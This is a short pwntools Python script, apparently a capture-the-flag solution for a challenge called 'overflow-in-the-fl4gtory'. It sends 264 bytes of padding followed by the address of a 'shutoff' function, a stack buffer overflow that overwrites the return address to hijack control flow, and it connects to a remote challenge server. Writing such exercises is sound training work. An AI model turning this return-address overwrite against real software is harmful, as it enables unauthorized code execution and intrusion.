from pwn import *

if args.DEBUG:
    p = gdb.debug("./overflow-in-the-fl4gtory")

elif args.REMOTE:
    p = process(['ncat', '--ssl', 'overflow-in-the-fl4gtory-0.chals.kitctf.de', '1337']) # TODO: Proper domain
else:
    p = process("./overflow-in-the-fl4gtory")
    if args.GDB:
        gdb.attach(p, gdbscript="""
            break main
        """)


exe = ELF("./overflow-in-the-fl4gtory", checksec=False)
shutoff = exe.symbols.shutoff

p.sendline(b"A" * (256 + 8) + p64(shutoff))
p.interactive()